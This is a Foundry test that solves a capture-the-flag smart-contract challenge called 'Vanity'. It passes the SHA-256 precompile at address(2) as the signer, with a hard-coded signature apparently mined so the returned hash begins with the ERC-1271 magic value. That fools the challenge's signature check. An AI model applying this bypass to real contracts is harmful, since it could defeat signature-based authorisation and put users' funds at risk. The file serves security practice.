pragma solidity ^0.7.6;

import "forge-std/Test.sol";

import "../src/vanity/public/contracts/Setup.sol";

// We must use a leaf that is closer from the root instead of a leaf
contract Vanity is Test {
    Setup setup;
    
    function test_hax() public {
        setup = new Setup();

        ////////// HAX //////////
        
        // @ctf when sending kec("MAGIC") + sig
        // @ctf its output hash must starts by 0x1626ba7e
        
        bytes4 sel = 0x1626ba7e;
        bytes32 hash = keccak256(abi.encodePacked("CHALLENGE_MAGIC"));
        
        emit log_named_bytes32("h", hash);
        
        // @ctf we need to mine a hash to start by sel
        // bytes memory sig = abi.encodePacked(keccak256(abi.encodePacked(uint256(1))));
        bytes memory sig = abi.encodePacked(bytes32(0xf3a95c205a9430fd6a7a065dfde49461a65ef97c52f478949633ae1d267e36ed));
        
        bytes memory full = abi.encodeWithSignature("isValidSignature(bytes32,bytes)", hash, sig);
        
        emit log_named_bytes("full", full);
        
        (bool success, bytes memory result) = address(2).staticcall(
            abi.encodeWithSelector(sel, hash, sig)
        );
        
        if (success) {
            emit log_named_bytes("res", result);
        }
        
        setup.challenge().solve(address(2), sig);

        /////////////////////////

        assertTrue(setup.isSolved());
    }
}